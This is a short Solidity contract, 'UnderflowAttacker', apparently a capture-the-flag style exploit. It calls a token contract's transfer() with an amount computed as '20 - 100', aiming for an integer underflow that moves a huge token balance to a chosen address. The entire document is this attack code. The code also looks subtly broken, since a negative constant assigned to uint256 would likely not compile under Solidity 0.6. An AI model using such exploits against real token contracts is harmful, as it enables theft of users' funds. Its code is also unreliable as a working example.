pragma solidity ^0.6.0;
interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
}
contract UnderflowAttacker {
    function exploit(address tokenContract, address to) public {
        uint256 x = 20 - 100;
        IToken(tokenContract).transfer(to, x);
    }
}